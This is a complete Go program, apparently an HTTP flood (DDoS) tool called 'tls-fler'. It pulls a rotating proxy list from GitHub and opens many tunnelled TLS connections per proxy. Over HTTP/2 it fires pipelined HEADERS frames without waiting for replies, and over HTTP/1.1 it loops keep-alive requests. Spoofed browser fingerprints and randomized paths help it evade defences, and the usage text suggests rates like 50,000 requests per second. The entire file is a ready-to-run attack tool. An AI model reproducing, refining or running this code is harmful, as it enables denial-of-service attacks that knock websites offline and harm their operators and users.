package main

import (
	"bufio"
	"bytes"
	"crypto/tls"
	"encoding/base64"
	"encoding/binary"
	"fmt"
	"io"
	"math/rand"
	"net"
	"net/http"
	"net/url"
	"os"
	"path/filepath"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"golang.org/x/net/http2/hpack"
	"golang.org/x/net/proxy"
)

const (
	proxyGitURL = "https://raw.githubusercontent.com/malasahjagotwin/restissue/refs/heads/master/proxy/global.txt"
	h2Preface   = "PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"
)

var uaPool = []string{
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Linux; Android 14; Pixel 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Mobile Safari/537.36",
	"Mozilla/5.0 (Linux; Android 13; SM-S911B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Mobile Safari/537.36",
}

var secChUaPool = []string{
	`"Chromium";v="136", "Google Chrome";v="136", "Not-A.Brand";v="99"`,
	`"Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"`,
	`"Not/A)Brand";v="8", "Chromium";v="136", "Google Chrome";v="136"`,
}

// ── stats ─────────────────────────────────────────────────────────────────────

var (
	statReq      int64
	statOK       int64
	statErr      int64
	statProxyOK  int64
	statProxyErr int64
	statH2       int64 // connections negotiated as h2
	statH1       int64 // connections negotiated as http/1.1
)

// ── proxy ─────────────────────────────────────────────────────────────────────

type ProxyType int

const (
	ProxyHTTP   ProxyType = iota
	ProxyHTTPS
	ProxySOCKS5
)

type Proxy struct {
	ptype      ProxyType
	host, port string
	user, pass string
}

func parseProxyLine(line string) (Proxy, bool) {
	line = strings.TrimSpace(line)
	if line == "" || strings.HasPrefix(line, "#") {
		return Proxy{}, false
	}

	var p Proxy

	switch {
	case strings.HasPrefix(line, "socks5://"):
		p.ptype = ProxySOCKS5
		u, err := url.Parse(line)
		if err != nil {
			return Proxy{}, false
		}
		p.host = u.Hostname()
		p.port = u.Port()
		if u.User != nil {
			p.user = u.User.Username()
			p.pass, _ = u.User.Password()
		}

	case strings.HasPrefix(line, "https://"):
		p.ptype = ProxyHTTPS
		u, err := url.Parse(line)
		if err != nil {
			return Proxy{}, false
		}
		p.host = u.Hostname()
		p.port = u.Port()
		if p.port == "" {
			p.port = "443"
		}
		if u.User != nil {
			p.user = u.User.Username()
			p.pass, _ = u.User.Password()
		}

	case strings.HasPrefix(line, "http://"):
		p.ptype = ProxyHTTP
		u, err := url.Parse(line)
		if err != nil {
			return Proxy{}, false
		}
		p.host = u.Hostname()
		p.port = u.Port()
		if p.port == "" {
			p.port = "80"
		}
		if u.User != nil {
			p.user = u.User.Username()
			p.pass, _ = u.User.Password()
		}

	default:
		// plain: host:port  or  host:port:user:pass
		parts := strings.Split(line, ":")
		if len(parts) < 2 {
			return Proxy{}, false
		}
		p.ptype = ProxyHTTP
		p.host = parts[0]
		p.port = parts[1]
		if len(parts) >= 4 {
			p.user = parts[2]
			p.pass = parts[3]
		}
	}

	if p.host == "" || p.port == "" {
		return Proxy{}, false
	}
	return p, true
}

type ProxyPool struct {
	mu   sync.RWMutex
	list []Proxy
	hash string
}

func loadProxies(r io.Reader) []Proxy {
	var out []Proxy
	sc := bufio.NewScanner(r)
	for sc.Scan() {
		if p, ok := parseProxyLine(sc.Text()); ok {
			out = append(out, p)
		}
	}
	return out
}

func proxyHash(list []Proxy) string {
	s := make([]string, len(list))
	for i, p := range list {
		s[i] = p.host + ":" + p.port
	}
	return strings.Join(s, ",")
}

func NewProxyPool(localPath string) (*ProxyPool, error) {
	pp := &ProxyPool{}

	// try GitHub first
	resp, err := http.Get(proxyGitURL)
	if err == nil && resp.StatusCode == 200 {
		list := loadProxies(resp.Body)
		resp.Body.Close()
		if len(list) > 0 {
			pp.list = list
			pp.hash = proxyHash(list)
			_ = writeProxyFile(localPath, list)
			fmt.Printf("[proxy] %d proxies loaded from GitHub\n", len(list))
			return pp, nil
		}
	}

	// fallback local
	f, err2 := os.Open(localPath)
	if err2 != nil {
		return nil, fmt.Errorf("no proxies available (github: %v, local: %v)", err, err2)
	}
	defer f.Close()
	list := loadProxies(f)
	if len(list) == 0 {
		return nil, fmt.Errorf("proxy file empty: %s", localPath)
	}
	pp.list = list
	pp.hash = proxyHash(list)
	fmt.Printf("[proxy] %d proxies loaded from %s\n", len(list), localPath)
	return pp, nil
}

func writeProxyFile(path string, list []Proxy) error {
	if err := os.MkdirAll(filepath.Dir(path), 0755); err != nil {
		return err
	}
	f, err := os.Create(path)
	if err != nil {
		return err
	}
	defer f.Close()
	for _, p := range list {
		switch p.ptype {
		case ProxySOCKS5:
			if p.user != "" {
				fmt.Fprintf(f, "socks5://%s:%s@%s:%s\n", p.user, p.pass, p.host, p.port)
			} else {
				fmt.Fprintf(f, "socks5://%s:%s\n", p.host, p.port)
			}
		case ProxyHTTPS:
			if p.user != "" {
				fmt.Fprintf(f, "https://%s:%s@%s:%s\n", p.user, p.pass, p.host, p.port)
			} else {
				fmt.Fprintf(f, "https://%s:%s\n", p.host, p.port)
			}
		default:
			if p.user != "" {
				fmt.Fprintf(f, "%s:%s:%s:%s\n", p.host, p.port, p.user, p.pass)
			} else {
				fmt.Fprintf(f, "%s:%s\n", p.host, p.port)
			}
		}
	}
	return nil
}

func (pp *ProxyPool) AutoUpdate(localPath string) {
	for range time.NewTicker(30 * time.Second).C {
		resp, err := http.Get(proxyGitURL)
		if err != nil || resp.StatusCode != 200 {
			continue
		}
		list := loadProxies(resp.Body)
		resp.Body.Close()
		if len(list) == 0 {
			continue
		}
		h := proxyHash(list)
		pp.mu.Lock()
		if h != pp.hash {
			pp.list = list
			pp.hash = h
			_ = writeProxyFile(localPath, list)
			fmt.Printf("[proxy] updated → %d proxies\n", len(list))
		}
		pp.mu.Unlock()
	}
}

func (pp *ProxyPool) Pick() Proxy {
	pp.mu.RLock()
	defer pp.mu.RUnlock()
	return pp.list[rand.Intn(len(pp.list))]
}

func (pp *ProxyPool) Len() int {
	pp.mu.RLock()
	defer pp.mu.RUnlock()
	return len(pp.list)
}

// Snapshot returns a copy of all proxies at this moment
func (pp *ProxyPool) Snapshot() []Proxy {
	pp.mu.RLock()
	defer pp.mu.RUnlock()
	out := make([]Proxy, len(pp.list))
	copy(out, pp.list)
	return out
}

// ── dial proxy → raw TCP tunnel → TLS h2 ─────────────────────────────────────

func dialSOCKS5(px Proxy, targetHost string, targetPort int) (net.Conn, error) {
	var auth *proxy.Auth
	if px.user != "" {
		auth = &proxy.Auth{User: px.user, Password: px.pass}
	}
	d, err := proxy.SOCKS5("tcp",
		net.JoinHostPort(px.host, px.port),
		auth,
		&net.Dialer{Timeout: 10 * time.Second},
	)
	if err != nil {
		return nil, err
	}
	return d.Dial("tcp", fmt.Sprintf("%s:%d", targetHost, targetPort))
}

func sendCONNECT(conn net.Conn, px Proxy, targetHost string, targetPort int) error {
	var buf bytes.Buffer
	fmt.Fprintf(&buf, "CONNECT %s:%d HTTP/1.1\r\n", targetHost, targetPort)
	fmt.Fprintf(&buf, "Host: %s:%d\r\n", targetHost, targetPort)
	if px.user != "" {
		cred := base64.StdEncoding.EncodeToString([]byte(px.user + ":" + px.pass))
		fmt.Fprintf(&buf, "Proxy-Authorization: Basic %s\r\n", cred)
	}
	buf.WriteString("Proxy-Connection: Keep-Alive\r\n\r\n")

	conn.SetDeadline(time.Now().Add(10 * time.Second))
	if _, err := conn.Write(buf.Bytes()); err != nil {
		return err
	}
	resp, err := http.ReadResponse(bufio.NewReader(conn), nil)
	if err != nil {
		return err
	}
	resp.Body.Close()
	conn.SetDeadline(time.Time{})
	if resp.StatusCode != 200 {
		return fmt.Errorf("CONNECT %s", resp.Status)
	}
	return nil
}

// dialTunnel returns a raw TCP conn that is already tunnelled to targetHost:targetPort
func dialTunnel(px Proxy, targetHost string, targetPort int) (net.Conn, error) {
	switch px.ptype {
	case ProxySOCKS5:
		return dialSOCKS5(px, targetHost, targetPort)

	case ProxyHTTPS:
		tc, err := net.DialTimeout("tcp", net.JoinHostPort(px.host, px.port), 10*time.Second)
		if err != nil {
			return nil, err
		}
		tlsProxy := tls.Client(tc, &tls.Config{ServerName: px.host, InsecureSkipVerify: true})
		tlsProxy.SetDeadline(time.Now().Add(10 * time.Second))
		if err := tlsProxy.Handshake(); err != nil {
			tlsProxy.Close()
			return nil, err
		}
		tlsProxy.SetDeadline(time.Time{})
		if err := sendCONNECT(tlsProxy, px, targetHost, targetPort); err != nil {
			tlsProxy.Close()
			return nil, err
		}
		return tlsProxy, nil

	default: // HTTP — plain TCP + CONNECT, or try SOCKS5 first
		// try SOCKS5 first (auto-detect)
		if conn, err := dialSOCKS5(px, targetHost, targetPort); err == nil {
			return conn, nil
		}
		// fallback HTTP CONNECT
		tc, err := net.DialTimeout("tcp", net.JoinHostPort(px.host, px.port), 10*time.Second)
		if err != nil {
			return nil, err
		}
		if err := sendCONNECT(tc, px, targetHost, targetPort); err != nil {
			tc.Close()
			return nil, err
		}
		return tc, nil
	}
}

// dialMix: negotiate h2 atau http/1.1, return conn + proto string
func dialMix(px Proxy, targetHost string, targetPort int) (net.Conn, string, error) {
	tunnel, err := dialTunnel(px, targetHost, targetPort)
	if err != nil {
		return nil, "", err
	}

	tlsCfg := &tls.Config{
		ServerName:         targetHost,
		InsecureSkipVerify: true,
		// tawarkan h2 dan http/1.1 — pakai yang server support
		NextProtos:       []string{"h2", "http/1.1"},
		MinVersion:       tls.VersionTLS12,
		CurvePreferences: []tls.CurveID{tls.X25519, tls.CurveP256},
		CipherSuites: []uint16{
			tls.TLS_AES_128_GCM_SHA256,
			tls.TLS_AES_256_GCM_SHA384,
			tls.TLS_CHACHA20_POLY1305_SHA256,
			tls.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256,
			tls.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256,
			tls.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384,
			tls.TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384,
			tls.TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305,
			tls.TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305,
		},
	}

	tlsConn := tls.Client(tunnel, tlsCfg)
	tlsConn.SetDeadline(time.Now().Add(10 * time.Second))
	if err := tlsConn.Handshake(); err != nil {
		tlsConn.Close()
		return nil, "", fmt.Errorf("TLS: %w", err)
	}
	proto := tlsConn.ConnectionState().NegotiatedProtocol
	if proto == "" {
		proto = "http/1.1"
	}
	tlsConn.SetDeadline(time.Time{})
	return tlsConn, proto, nil
}

// ── HTTP/2 raw frame helpers ──────────────────────────────────────────────────

func h2Frame(streamID uint32, ftype, flags uint8, payload []byte) []byte {
	l := len(payload)
	f := make([]byte, 9+l)
	f[0] = byte(l >> 16)
	f[1] = byte(l >> 8)
	f[2] = byte(l)
	f[3] = ftype
	f[4] = flags
	binary.BigEndian.PutUint32(f[5:], streamID&0x7FFFFFFF)
	copy(f[9:], payload)
	return f
}

func settingsPayload() []byte {
	pairs := [][2]uint32{
		{0x1, 65536},
		{0x2, 0},
		{0x4, 6291456},
		{0x6, 262144},
	}
	b := make([]byte, 6*len(pairs))
	for i, p := range pairs {
		binary.BigEndian.PutUint16(b[i*6:], uint16(p[0]))
		binary.BigEndian.PutUint32(b[i*6+2:], p[1])
	}
	return b
}

func winUpdatePayload(inc uint32) []byte {
	b := make([]byte, 4)
	binary.BigEndian.PutUint32(b, inc)
	return b
}

// ── path builder ──────────────────────────────────────────────────────────────

func randStr(n int) string {
	const chars = "abcdefghijklmnopqrstuvwxyz0123456789"
	b := make([]byte, n)
	for i := range b {
		b[i] = chars[rand.Intn(len(chars))]
	}
	return string(b)
}

func buildPath(u *url.URL) string {
	p := u.Path
	if p == "" {
		p = "/"
	}
	for strings.Contains(p, "%RAND%") {
		p = strings.Replace(p, "%RAND%", randStr(rand.Intn(10)+6), 1)
	}
	q := randStr(rand.Intn(6)+4) + "=" + randStr(rand.Intn(8)+4)
	if strings.Contains(p, "?") {
		return p + "&" + q
	}
	return p + "?" + q
}

// ── HTTP/1.1 session ──────────────────────────────────────────────────────────

func runSessionH1(conn net.Conn, u *url.URL, deadline time.Time) {
	defer conn.Close()
	br := bufio.NewReader(conn)
	for time.Now().Before(deadline) {
		path := buildPath(u)
		ua := uaPool[rand.Intn(len(uaPool))]
		secChUa := secChUaPool[rand.Intn(len(secChUaPool))]
		isMobile := rand.Intn(100) < 35
		mobileVal, platformVal := "?0", `"Windows"`
		if isMobile {
			mobileVal, platformVal = "?1", `"Android"`
		}

		var req bytes.Buffer
		fmt.Fprintf(&req, "GET %s HTTP/1.1\r\n", path)
		fmt.Fprintf(&req, "Host: %s\r\n", u.Hostname())
		fmt.Fprintf(&req, "User-Agent: %s\r\n", ua)
		fmt.Fprintf(&req, "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8\r\n")
		fmt.Fprintf(&req, "Accept-Encoding: gzip, deflate, br, zstd\r\n")
		fmt.Fprintf(&req, "Accept-Language: en-US,en;q=0.9\r\n")
		fmt.Fprintf(&req, "Cache-Control: no-cache\r\n")
		fmt.Fprintf(&req, "Sec-Ch-Ua: %s\r\n", secChUa)
		fmt.Fprintf(&req, "Sec-Ch-Ua-Mobile: %s\r\n", mobileVal)
		fmt.Fprintf(&req, "Sec-Ch-Ua-Platform: %s\r\n", platformVal)
		fmt.Fprintf(&req, "Sec-Fetch-Dest: document\r\n")
		fmt.Fprintf(&req, "Sec-Fetch-Mode: navigate\r\n")
		fmt.Fprintf(&req, "Sec-Fetch-Site: none\r\n")
		fmt.Fprintf(&req, "Sec-Fetch-User: ?1\r\n")
		fmt.Fprintf(&req, "Upgrade-Insecure-Requests: 1\r\n")
		fmt.Fprintf(&req, "Connection: keep-alive\r\n\r\n")

		conn.SetWriteDeadline(time.Now().Add(5 * time.Second))
		if _, err := conn.Write(req.Bytes()); err != nil {
			return
		}
		atomic.AddInt64(&statReq, 1)

		conn.SetReadDeadline(time.Now().Add(10 * time.Second))
		resp, err := http.ReadResponse(br, nil)
		if err != nil {
			return
		}
		io.Copy(io.Discard, resp.Body)
		resp.Body.Close()

		if resp.StatusCode >= 200 && resp.StatusCode < 500 {
			atomic.AddInt64(&statOK, 1)
		} else {
			atomic.AddInt64(&statErr, 1)
		}

		if resp.Header.Get("Connection") == "close" {
			return
		}
	}
}

// ── HTTP/2 session — send raw HEADERS frames ──────────────────────────────────

func runSession(conn net.Conn, u *url.URL, deadline time.Time) {
	defer conn.Close()

	// client preface
	var preface []byte
	preface = append(preface, []byte(h2Preface)...)
	preface = append(preface, h2Frame(0, 0x4, 0, settingsPayload())...)
	preface = append(preface, h2Frame(0, 0x8, 0, winUpdatePayload(15663105))...)
	if _, err := conn.Write(preface); err != nil {
		return
	}

	// reader — drain server frames, reply SETTINGS/PING, count status
	go func() {
		br := bufio.NewReaderSize(conn, 64*1024)
		hdr := make([]byte, 9)
		dec := hpack.NewDecoder(4096, nil)
		for {
			if _, err := io.ReadFull(br, hdr); err != nil {
				return
			}
			plen := int(hdr[0])<<16 | int(hdr[1])<<8 | int(hdr[2])
			ftype := hdr[3]
			flags := hdr[4]
			payload := make([]byte, plen)
			if plen > 0 {
				if _, err := io.ReadFull(br, payload); err != nil {
					return
				}
			}
			switch ftype {
			case 0x4:
				if flags&0x1 == 0 {
					conn.Write(h2Frame(0, 0x4, 0x1, nil))
				}
			case 0x6:
				conn.Write(h2Frame(0, 0x6, 0x1, payload))
			case 0x7:
				conn.Close()
				return
			case 0x1:
				hdrs, err := dec.DecodeFull(payload)
				if err != nil {
					continue
				}
				for _, h := range hdrs {
					if h.Name == ":status" {
						code, _ := strconv.Atoi(h.Value)
						if code >= 200 && code < 500 {
							atomic.AddInt64(&statOK, 1)
						} else {
							atomic.AddInt64(&statErr, 1)
						}
					}
				}
			}
		}
	}()

	// writer — kirim frames secepat mungkin, tanpa tunggu response
	// ini yang bikin throughput tinggi: pipeline semua stream sekaligus
	streamID := uint32(1)
	var hpackBuf bytes.Buffer
	enc := hpack.NewEncoder(&hpackBuf)

	for time.Now().Before(deadline) {
		ua := uaPool[rand.Intn(len(uaPool))]
		secChUa := secChUaPool[rand.Intn(len(secChUaPool))]
		isMobile := rand.Intn(100) < 35
		mobileVal, platformVal := "?0", `"Windows"`
		if isMobile {
			mobileVal, platformVal = "?1", `"Android"`
		}
		cacheCtrl := "no-cache"
		if rand.Intn(2) == 0 {
			cacheCtrl = "max-age=0"
		}

		hpackBuf.Reset()
		for _, field := range []hpack.HeaderField{
			{Name: ":method", Value: "GET"},
			{Name: ":authority", Value: u.Hostname()},
			{Name: ":scheme", Value: "https"},
			{Name: ":path", Value: buildPath(u)},
			{Name: "cache-control", Value: cacheCtrl},
			{Name: "sec-ch-ua", Value: secChUa},
			{Name: "sec-ch-ua-mobile", Value: mobileVal},
			{Name: "sec-ch-ua-platform", Value: platformVal},
			{Name: "upgrade-insecure-requests", Value: "1"},
			{Name: "user-agent", Value: ua},
			{Name: "accept", Value: "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7"},
			{Name: "sec-fetch-site", Value: "none"},
			{Name: "sec-fetch-mode", Value: "navigate"},
			{Name: "sec-fetch-user", Value: "?1"},
			{Name: "sec-fetch-dest", Value: "document"},
			{Name: "accept-encoding", Value: "gzip, deflate, br, zstd"},
			{Name: "accept-language", Value: "en-US,en;q=0.9"},
			{Name: "priority", Value: "u=0, i"},
		} {
			enc.WriteField(field)
		}

		encoded := hpackBuf.Bytes()
		payload := make([]byte, 5+len(encoded))
		payload[0] = 0x80
		payload[4] = 0xFF
		copy(payload[5:], encoded)

		conn.SetWriteDeadline(time.Now().Add(5 * time.Second))
		if _, err := conn.Write(h2Frame(streamID, 0x1, 0x25, payload)); err != nil {
			return
		}
		atomic.AddInt64(&statReq, 1)
		streamID += 2
		if streamID > 0x7FFFFFFF {
			return
		}
	}
}

// ── worker — 1 goroutine per proxy, buka BANYAK koneksi paralel ──────────────

// connsPerProxy: berapa koneksi simultan per proxy
const connsPerProxy = 16

func workerForProxy(px Proxy, u *url.URL, port int, deadline time.Time, wg *sync.WaitGroup) {
	defer wg.Done()

	var inner sync.WaitGroup
	for i := 0; i < connsPerProxy; i++ {
		inner.Add(1)
		go func() {
			defer inner.Done()
			for time.Now().Before(deadline) {
				conn, proto, err := dialMix(px, u.Hostname(), port)
				if err != nil {
					atomic.AddInt64(&statProxyErr, 1)
					time.Sleep(300 * time.Millisecond)
					continue
				}
				atomic.AddInt64(&statProxyOK, 1)
				if proto == "h2" {
					atomic.AddInt64(&statH2, 1)
					runSession(conn, u, deadline)
				} else {
					atomic.AddInt64(&statH1, 1)
					runSessionH1(conn, u, deadline)
				}
			}
		}()
	}
	inner.Wait()
}

// ── main ──────────────────────────────────────────────────────────────────────

func main() {
	if len(os.Args) < 4 {
		fmt.Fprintf(os.Stderr, "Usage: %s <url> <duration_sec> <rate_per_sec> [proxy_file]\n", os.Args[0])
		fmt.Fprintf(os.Stderr, "\nExample:\n")
		fmt.Fprintf(os.Stderr, "  ./tls-fler https://example.com 60 50000\n")
		fmt.Fprintf(os.Stderr, "  ./tls-fler https://example.com/%%RAND%% 60 50000 global.txt\n")
		fmt.Fprintf(os.Stderr, "\nProxy file formats:\n")
		fmt.Fprintf(os.Stderr, "  ip:port                       HTTP\n")
		fmt.Fprintf(os.Stderr, "  ip:port:user:pass             HTTP + auth (also tries SOCKS5)\n")
		fmt.Fprintf(os.Stderr, "  http://user:pass@ip:port      HTTP explicit\n")
		fmt.Fprintf(os.Stderr, "  https://user:pass@ip:port     HTTPS\n")
		fmt.Fprintf(os.Stderr, "  socks5://user:pass@ip:port    SOCKS5 explicit\n")
		os.Exit(1)
	}

	targetRaw := os.Args[1]
	duration, err := strconv.Atoi(os.Args[2])
	if err != nil || duration <= 0 {
		fmt.Fprintln(os.Stderr, "error: duration must be positive integer")
		os.Exit(1)
	}
	rate, err := strconv.Atoi(os.Args[3])
	if err != nil || rate <= 0 {
		fmt.Fprintln(os.Stderr, "error: rate must be positive integer")
		os.Exit(1)
	}

	// proxy file default: sejajar dengan binary
	execDir := filepath.Dir(os.Args[0])
	proxyFile := filepath.Join(execDir, "global.txt")
	if len(os.Args) >= 5 {
		proxyFile = os.Args[4]
	}

	u, err := url.Parse(targetRaw)
	if err != nil {
		fmt.Fprintf(os.Stderr, "error: invalid url: %v\n", err)
		os.Exit(1)
	}

	pool, err := NewProxyPool(proxyFile)
	if err != nil {
		fmt.Fprintf(os.Stderr, "error: %v\n", err)
		os.Exit(1)
	}
	go pool.AutoUpdate(proxyFile)

	port := 443
	if p := u.Port(); p != "" {
		port, _ = strconv.Atoi(p)
	}

	runtime.GOMAXPROCS(runtime.NumCPU())

	// 1 goroutine per proxy — semua proxy jalan sekaligus, tidak antri
	proxies := pool.Snapshot()
	workers := len(proxies)

	deadline := time.Now().Add(time.Duration(duration) * time.Second)

	fmt.Printf("\n[tls-fler] target=%s duration=%ds rate=%d/s proxies=%d (each gets dedicated goroutine)\n\n",
		u.Hostname(), duration, rate, workers)

	start := time.Now()
	var wg sync.WaitGroup
	for _, px := range proxies {
		wg.Add(1)
		go workerForProxy(px, u, port, deadline, &wg)
	}

	// live stats every 3s
	go func() {
		ticker := time.NewTicker(3 * time.Second)
		var lastReq int64
		for range ticker.C {
			cur := atomic.LoadInt64(&statReq)
			rps := (cur - lastReq) / 3
			lastReq = cur
			pOK := atomic.LoadInt64(&statProxyOK)
			pErr := atomic.LoadInt64(&statProxyErr)
			total := pOK + pErr
			pct := 0.0
			if total > 0 {
				pct = float64(pOK) / float64(total) * 100
			}
			fmt.Printf("[stats] req=%d ok=%d err=%d rps=%d | proxy ok=%d err=%d (%.1f%%) | h2=%d h1=%d\n",
				cur,
				atomic.LoadInt64(&statOK),
				atomic.LoadInt64(&statErr),
				rps,
				pOK, pErr, pct,
				atomic.LoadInt64(&statH2),
				atomic.LoadInt64(&statH1),
			)
		}
	}()

	wg.Wait()

	elapsed := time.Since(start).Seconds()
	pOK := atomic.LoadInt64(&statProxyOK)
	pErr := atomic.LoadInt64(&statProxyErr)
	fmt.Println("\n========== SUMMARY ==========")
	fmt.Printf("Target        : %s\n", u)
	fmt.Printf("Duration      : %.2fs\n", elapsed)
	fmt.Printf("Total Req     : %d\n", statReq)
	fmt.Printf("HTTP 2xx-4xx  : %d\n", statOK)
	fmt.Printf("HTTP 5xx+     : %d\n", statErr)
	fmt.Printf("Avg RPS       : %.0f\n", float64(statReq)/elapsed)
	fmt.Printf("Proxy OK      : %d\n", pOK)
	fmt.Printf("Proxy Err     : %d\n", pErr)
	fmt.Printf("H2 conns      : %d\n", atomic.LoadInt64(&statH2))
	fmt.Printf("H1 conns      : %d\n", atomic.LoadInt64(&statH1))
	fmt.Println("=============================")
}
